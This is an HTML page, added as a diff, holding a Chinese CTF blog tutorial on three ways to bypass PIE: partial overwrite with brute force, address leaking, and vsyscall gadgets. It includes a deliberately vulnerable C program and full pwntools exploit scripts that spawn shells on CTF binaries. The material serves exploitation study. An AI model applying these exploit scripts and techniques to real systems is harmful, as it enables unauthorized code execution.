@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        PIE保护和三种bypass姿势 - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、partial-write"><span class="toc-text">一、partial write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、泄露地址"><span class="toc-text">二、泄露地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、vdso-vsyscall"><span class="toc-text">三、vdso/vsyscall</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#个人感悟："><span class="toc-text">个人感悟：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文献："><span class="toc-text">参考文献：</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        PIE保护和三种bypass姿势
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-04-30 17:00:24</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>第一次被安全客发表，有几分激动！</p>
+<a id="more"></a>
+<p>本文转载自安全客！！！<a href="https://www.anquanke.com/post/id/177520" target="_blank" rel="noopener">链接</a></p>
+<p>什么是PIE呢？</p>
+<p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题</p>
+<p>下面通过一个例子来具体看一下PIE的效果</p>
+<p>程序源码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s"</span>,<span class="string">"hello world!"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译命令</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-<span class="keyword">stack</span>-protector -<span class="keyword">no</span>-pie -s <span class="keyword">test</span>.c -o <span class="keyword">test</span>		#不开启PIE保护</span><br></pre></td></tr></table></figure>
+
+<p>不开启PIE保护的时候每次运行时加载地址不变<br><img src="https://s2.ax1x.com/2019/04/30/EGusk4.png" alt><br>开启PIE保护的时候每次运行时加载地址是随机变化的<br><img src="https://s2.ax1x.com/2019/04/30/EGu40O.png" alt> </p>
+<p>可以看出，如果一个程序开启了PIE保护的话，对于ROP造成很大影响，下面来讲解一下绕过PIE开启的方法</p>
+<h3 id="一、partial-write"><a href="#一、partial-write" class="headerlink" title="一、partial write"></a>一、partial write</h3><p>partial write就是利用了PIE技术的缺陷。我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">houmen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">20</span>];</span><br><span class="line">	read(<span class="number">0</span>,a,<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">puts</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># gcc -m32 -fno-stack-protector  -s test.c -o test</span></span><br></pre></td></tr></table></figure>
+
+<p>明显的栈溢出，通过gdb调试，直接来到vuln函数的ret处，可以看到houmen函数的地址和返回地址只有后几位不一样，那么我们覆盖地址的后4位即可<br><img src="https://s2.ax1x.com/2019/04/30/EGuTtH.png" alt><br>由于地址的后3位一样，所以覆盖的话至少需要4位，那么倒数第四位就需要爆破，爆破范围在0到0xf<br>exp：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import <span class="built_in">random</span></span><br><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">offset</span> = <span class="number">0x1c</span>+<span class="number">4</span></span><br><span class="line">list1 = [<span class="string">"\x05"</span>,<span class="string">"\x15"</span>,<span class="string">"\x25"</span>,<span class="string">"\x35"</span>,<span class="string">"\x45"</span>,<span class="string">"\x55"</span>,<span class="string">"\x65"</span>,<span class="string">"\x75"</span>,<span class="string">"\x85"</span>,<span class="string">"\x95"</span>,<span class="string">"\xa5"</span>,<span class="string">"\xb5"</span>,<span class="string">"\xc5"</span>,<span class="string">"\xd5"</span>,<span class="string">"\xe5"</span>,<span class="string">"\xf5"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = <span class="built_in">process</span>(<span class="string">"./test"</span>)</span><br><span class="line">		payload = <span class="built_in">offset</span>*<span class="string">"a"</span>+<span class="string">"\x7d"</span>+<span class="built_in">random</span>.sample(list1,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">		p.<span class="built_in">send</span>(payload)</span><br><span class="line">		p.recv()</span><br><span class="line">		p.recv()</span><br><span class="line">	except Exception <span class="keyword">as</span> e:</span><br><span class="line">		p.<span class="built_in">close</span>()</span><br><span class="line">		print e</span><br></pre></td></tr></table></figure>
+
+<p>可以很快的得到爆破的结果<br><img src="https://s2.ax1x.com/2019/04/30/EGub9A.png" alt> </p>
+<h3 id="二、泄露地址"><a href="#二、泄露地址" class="headerlink" title="二、泄露地址"></a>二、泄露地址</h3><p>开启PIE保护的话影响的是程序加载的基地址，不会影响指令间的相对地址，因此我们如果能够泄露出程序或者libc的某些地址，我们就可以利用偏移来构造ROP</p>
+<p>以国赛your_pwn作为例子，该程序保护全开，漏洞点在sub_B35函数，index索引没有控制大小，所以导致任意地址读和任意地址写。</p>
+<p>泄露libc地址和泄露程序基地址的方法是在main函数栈帧中有一个__libc_start_main+231和push r15，可以通过泄露这两个地址计算出libc基地址和程序加载基地址<br><img src="https://s2.ax1x.com/2019/04/30/EGuLct.png" alt> </p>
+<p>exp：（需要用到LibcSearcher）</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">__libc_start_main_231_offset</span> = <span class="number">0</span>x150+<span class="number">296</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">r.sendline(<span class="string">"radish"</span>)</span><br><span class="line"><span class="variable">__libc_start_main_231_addr</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># leak __libc_start_main_231_addr</span></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="variable">__libc_start_main_231_offset</span>+x))</span><br><span class="line">	r.recvuntil(<span class="string">"(hex) "</span>)</span><br><span class="line">	data = r.recvuntil(<span class="string">"\n"</span>,<span class="built_in">drop</span>=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">if</span> len(data)&gt;<span class="number">2</span>:</span><br><span class="line">		data = data[-<span class="number">2</span>:]</span><br><span class="line">	elif len(data)==<span class="number">1</span>:</span><br><span class="line">		data = <span class="string">"0"</span>+data</span><br><span class="line">	<span class="variable">__libc_start_main_231_addr</span> = data+<span class="variable">__libc_start_main_231_addr</span></span><br><span class="line">	r.recvuntil(<span class="string">"input new value"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"__libc_start_main_231_addr -&gt;&gt; "</span>+<span class="variable">__libc_start_main_231_addr</span>)</span><br><span class="line"><span class="variable">__libc_start_main_231_addr</span> = eval(<span class="string">"0x"</span>+<span class="variable">__libc_start_main_231_addr</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push_r15_offset = <span class="number">0</span>x150+<span class="number">288</span></span><br><span class="line">push_r15_addr = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(push_r15_offset+x))</span><br><span class="line">	r.recvuntil(<span class="string">"(hex) "</span>)</span><br><span class="line">	data = r.recvuntil(<span class="string">"\n"</span>,<span class="built_in">drop</span>=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">if</span> len(data)&gt;<span class="number">2</span>:</span><br><span class="line">		data = data[-<span class="number">2</span>:]</span><br><span class="line">	elif len(data)==<span class="number">1</span>:</span><br><span class="line">		data = <span class="string">"0"</span>+data</span><br><span class="line">	push_r15_addr = data+push_r15_addr</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"push_r15_addr -&gt;&gt; "</span>+push_r15_addr)</span><br><span class="line">push_r15_addr = eval(<span class="string">"0x"</span>+push_r15_addr)</span><br><span class="line"></span><br><span class="line">main_addr = push_r15_addr - <span class="number">0</span>x23b</span><br><span class="line"></span><br><span class="line"><span class="meta"># cover ret_addr</span></span><br><span class="line">offset = <span class="number">0</span>x150+<span class="number">8</span></span><br><span class="line">main_addr = p64(main_addr).encode(<span class="string">"hex"</span>)</span><br><span class="line">print main_addr</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(offset+x))</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(eval(<span class="string">"0x"</span>+main_addr[num:num+<span class="number">2</span>])))</span><br><span class="line">	print <span class="built_in">str</span>(eval(<span class="string">"0x"</span>+main_addr[num:num+<span class="number">2</span>]))</span><br><span class="line">	num = num + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"------------------- success cover! -------------------"</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">41</span>-<span class="number">24</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"------------------- ret main success ---------------"</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_addr =  <span class="number">99</span>+push_r15_addr</span><br><span class="line"></span><br><span class="line"><span class="variable">__libc_start_main_addr</span> = <span class="variable">__libc_start_main_231_addr</span>-<span class="number">231</span></span><br><span class="line"><span class="meta"># libc = LibcSearcher(<span class="meta-string">"__libc_start_main"</span>,__libc_start_main_addr)</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">base_addr = <span class="variable">__libc_start_main_addr</span>-libc.symbols[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">print hex(base_addr)</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]+base_addr</span><br><span class="line">bin_sh_addr = <span class="number">0</span>x000000000017d3f3+base_addr</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"system_addr: "</span>+hex(system_addr))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"bin_sh_addr: "</span>+hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = (p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)).encode(<span class="string">"hex"</span>)</span><br><span class="line">print payload</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"radish"</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">0</span>,<span class="number">24</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(offset+x))</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(eval(<span class="string">"0x"</span>+payload[num:num+<span class="number">2</span>])))</span><br><span class="line">	print <span class="built_in">str</span>(eval(<span class="string">"0x"</span>+payload[num:num+<span class="number">2</span>]))</span><br><span class="line">	num = num + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"------------------- cover payload success ---------------"</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">41</span>-<span class="number">24</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="meta">#gdb.attach(r)</span></span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line"><span class="built_in">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、vdso-vsyscall"><a href="#三、vdso-vsyscall" class="headerlink" title="三、vdso/vsyscall"></a>三、vdso/vsyscall</h3><p>vsyscall是什么呢？ </p>
+<p>通过查阅资料得知，vsyscall是第一种也是最古老的一种用于加快系统调用的机制，工作原理十分简单，许多硬件上的操作都会被包装成内核函数，然后提供一个接口，供用户层代码调用，这个接口就是我们常用的int 0x80和syscall+调用号。</p>
+<p>当通过这个接口来调用时，由于需要进入到内核去处理，因此为了保证数据的完整性，需要在进入内核之前把寄存器的状态保存好，然后进入到内核状态运行内核函数，当内核函数执行完的时候会将返回结果放到相应的寄存器和内存中，然后再对寄存器进行恢复，转换到用户层模式。</p>
+<p>这一过程需要消耗一定的性能，对于某些经常被调用的系统函数来说，肯定会造成很大的内存浪费，因此，系统把几个常用的内核调用从内核中映射到用户层空间中，从而引入了vsyscall</p>
+<p>通过命令“cat /proc/self/maps| grep vsyscall”查看，发现vsyscall地址是不变的<br><img src="https://s2.ax1x.com/2019/04/30/EGujnf.png" alt> </p>
+<p>使用gdb把vsyscall从内存中dump下来，拖到IDA中分析<br><img src="https://s2.ax1x.com/2019/04/30/EGuxHS.png" alt> </p>
+<p>可以看到里面有三个系统调用，根据对应表得出这三个系统调用分别是__NR_gettimeofday、__NR_time、<em>\</em>NR_getcpu</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettimeofday 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time 201</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcpu 309</span></span><br></pre></td></tr></table></figure>
+
+<p>这三个都是系统调用，并且也都是通过syscall来实现的，这就意味着我们有了一个可控的syscall</p>
+<p> 拿一道CTF真题来做为例子（1000levels）：<br>程序具体漏洞这里不再过多的解释，只写涉及到利用vsyscall的步骤</p>
+<p>当我们直接调用vsyscall中的syscall时，会提示段错误，这是因为vsyscall执行时会进行检查，如果不是从函数开头执行的话就会出错<br><img src="https://s2.ax1x.com/2019/04/30/EGKi3n.png" alt> </p>
+<p>所以，我们可以直接利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800</p>
+<p>程序开启了PIE，无法从该程序中直接跳转到main函数或者其他地址，因此可以使用vsyscall来充当gadget，使用它的原因也是因为它在内存中的地址是不变的</p>
+<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span> =process(<span class="string">'1000levels'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">-0x456a0</span>					#减去system函数离libc开头的偏移</span><br><span class="line">one_gadget_base = <span class="number">0x45526</span>			#加上one gadget rce离libc开头的偏移</span><br><span class="line">vsyscall_gettimeofday = <span class="number">0xffffffffff600000</span></span><br><span class="line">def answer():</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'Question: '</span>) </span><br><span class="line">	answer = eval(<span class="built_in">io</span>.recvuntil(<span class="string">' = '</span>)[:<span class="number">-3</span>])</span><br><span class="line">	<span class="built_in">io</span>.recvuntil(<span class="string">'Answer:'</span>)</span><br><span class="line">	<span class="built_in">io</span>.sendline(str(answer))</span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line"><span class="built_in">io</span>.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line"><span class="built_in">io</span>.sendline(<span class="string">'1'</span>)	</span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">'How many levels?'</span>)</span><br><span class="line"><span class="built_in">io</span>.sendline(<span class="string">'-1'</span>)</span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">'Any more?'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.sendline(str(libc_base+one_gadget_base))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999</span>):</span><br><span class="line">	log.info(i)</span><br><span class="line">	answer()</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">'Question: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.send(<span class="string">'a'</span>*<span class="number">0x38</span> + p64(vsyscall_gettimeofday)*<span class="number">3</span>) </span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>vdso好处是其中的指令可以任意执行，不需要从入口开始，坏处是它的地址是随机化的，如果要利用它，就需要爆破它的地址，在64位下需要爆破的位数很多，但是在32位下需要爆破的字节数就很少。</p>
+<h3 id="个人感悟："><a href="#个人感悟：" class="headerlink" title="个人感悟："></a>个人感悟：</h3><p>在之前比赛中遇到开启PIE的程序时，脑子里没有一些特定的技术手法来绕过，最起码学了这个之后，在以后遇到类似问题的时候能想到用这些方法绕过。</p>
+<p>希望我在安全这条路上越走越远！本文如有不妥之处，敬请斧正。</p>
+<h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p><a href="https://1ce0ear.github.io/2017/12/22/vsyscalls/" target="_blank" rel="noopener">hitb2017 - 1000levels [Study]</a> </p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
